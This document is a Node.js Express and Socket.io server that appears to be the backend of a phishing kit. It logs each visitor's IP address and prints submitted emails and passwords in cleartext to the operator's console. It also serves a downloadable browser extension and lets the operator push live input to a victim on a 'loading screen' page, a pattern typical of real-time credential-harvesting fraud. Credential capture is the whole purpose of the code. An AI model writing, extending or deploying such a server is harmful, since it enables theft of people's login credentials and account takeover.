const express = require('express');
const socketIo = require('socket.io');
const http = require('http');
const path = require('path');
const readline = require('readline');
const fs = require('fs');

const app = express();
const server = http.createServer(app);
const io = socketIo(server);

const rl = readline.createInterface({
  input: process.stdin,
  output: process.stdout
});


// ==========================
// 🌐 STATIC FILES
// ==========================

app.use(express.static(__dirname));

app.get('/download-extension', (req, res) => {
  const filePath = path.join(__dirname, 'extention.zip');

  if (fs.existsSync(filePath)) {
    res.download(filePath);
  } else {
    res.status(404).send('Extension not found.');
  }
});

app.get('/index.html', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

app.get('/loading-screen.html', (req, res) => {
  res.sendFile(path.join(__dirname, 'loading-screen.html'));
});


// ==========================
// 🔧 IP FORMATTER
// ==========================

function formatIP(rawIP) {
  if (!rawIP) return { ipv4: "Unknown", ipv6: "Unknown" };

  // IPv6 mapped IPv4 (::ffff:127.0.0.1)
  if (rawIP.startsWith("::ffff:")) {
    return {
      ipv4: rawIP.replace("::ffff:", ""),
      ipv6: rawIP
    };
  }

  // Pure IPv6
  if (rawIP.includes(":")) {
    return {
      ipv4: "N/A",
      ipv6: rawIP
    };
  }

  // Pure IPv4
  return {
    ipv4: rawIP,
    ipv6: "N/A"
  };
}


// ==========================
// 🔌 SOCKET.IO
// ==========================

io.on('connection', (socket) => {
  const rawIP =
    socket.handshake.headers['x-forwarded-for'] ||
    socket.handshake.address;

  const ip = formatIP(rawIP);

  console.log(`
==============================
CONNECT
==============================
IPv4: ${ip.ipv4}
IPv6: ${ip.ipv6}
==============================
  `);

  // LOGIN EVENT
  socket.on('login', (data) => {
    const { email, password } = data;

    console.log(`
==============================
LOGIN ATTEMPT
==============================
IPv4: ${ip.ipv4}
IPv6: ${ip.ipv6}
Email: ${email || "N/A"}
Password: ${password || "N/A"}
==============================
    `);
  });

  // CLIENT TRIGGER
  socket.on('loadingPageVisited', () => {
    rl.question("Enter a string to send to the client: ", (userInput) => {
      console.log(`Sending input: ${userInput}`);
      socket.emit('serverInput', userInput);
    });
  });

  // DISCONNECT
  socket.on('disconnect', () => {
    console.log(`
==============================
DISCONNECT
==============================
IPv4: ${ip.ipv4}
IPv6: ${ip.ipv6}
==============================
    `);
  });
});


// ==========================
// 🚀 START SERVER
// ==========================

const PORT = 3000;

server.listen(PORT, () => {
  console.log(`Server is running at http://localhost:${PORT}`);
});
